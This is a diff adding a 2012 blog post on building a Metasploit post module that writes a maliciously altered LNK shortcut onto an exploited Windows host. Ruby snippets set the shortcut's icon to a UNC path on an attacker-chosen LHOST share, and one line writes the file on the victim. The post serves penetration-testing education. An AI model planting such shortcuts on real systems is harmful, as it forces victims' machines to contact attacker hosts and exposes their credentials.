@@ -1,0 +1,77 @@
+---
+author: mubix
+comments: true
+date: 2012-02-19 05:57:02+00:00
+layout: post
+title: Developing the LNK Metasploit post module with Mona
+categories:
+- lnk
+- metasploit
+- mona
+---
+
+I have been using the LNK trick I talked about in my [last post](/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018) for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it's target.
+
+Of course the first place I looked was Meterpreter's Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to [work with COM objects](http://msdn.microsoft.com/en-us/library/aa969393.aspx). Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch [using the spec](http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx).. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz
+
+Enter [mona](http://redmine.corelan.be/projects/mona), the [Corelan Team’s](http://www.corelan.be/) exploit development plugin for [Immunity Debugger](http://immunityinc.com/products-immdbg.shtml). Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.
+
+We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:
+
+![](/images/postimages/201202_mona_1.png)
+
+I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:
+
+`“!mona header C:\autoexec.lnk”`
+
+![](/images/postimages/201202_mona_2.png)
+
+As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:
+
+```ruby
+header << Rex::Text.to_unicode("C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`")
+```
+
+I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.
+
+Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?
+
+Now I have 3 challenges:
+
+1. It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.
+2. It needs to upload the file to the exploited system.
+3. It needs to be up to code on the Metasploit coding standards
+
+Changing the line I found for the share name into this:
+
+
+```ruby
+lnk << Rex::Text.to_unicode("\\\\#{datastore['LHOST']}\\#{datastore['SHARENAME']}\\#{datastore['ICONFILENAME']}`")
+```
+
+‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:
+
+
+```ruby
+OptAddressRange.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
+OptString.new("SHARENAME", [ true, "Share name on LHOST", "share1"]),       
+OptString.new("ICONFILENAME", [ true, "File name on LHOST's share", "icon.png"])
+```
+
+OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.
+
+Problem 1 solved. Problem 2 was just as easy, the following line:
+
+```
+file = client.fs.file.new(datastore['LNKFILENAME'], 'wb')
+```
+
+creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.
+
+Problem 3 is much more tricky, but here is the path to wisdom:
+
+```
+ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
+```
+
+Hope this helps spur people into trying their hand at developing some modules of their own.
